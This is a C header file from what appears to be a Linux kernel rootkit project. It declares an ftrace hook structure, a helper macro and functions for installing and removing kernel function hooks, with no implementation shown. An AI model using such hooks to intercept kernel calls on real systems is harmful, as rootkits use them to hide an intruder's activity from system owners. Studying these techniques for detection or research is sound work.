#ifndef BSO_ROOTKIT_FTRACE_UTILS_H
#define BSO_ROOTKIT_FTRACE_UTILS_H

#include <linux/ftrace.h>

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

// Helper macro to create ftrace_hook.
#define HOOK(_name, _function, _original)                                      \
	{                                                                      \
		.name = (_name), .function = (_function),                      \
		.original = (_original),                                       \
	}

bool lookup_helpers(void);
// tr_func - traced function

void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops, struct pt_regs *regs);
int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);

int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

#endif //BSO_ROOTKIT_FTRACE_UTILS_H
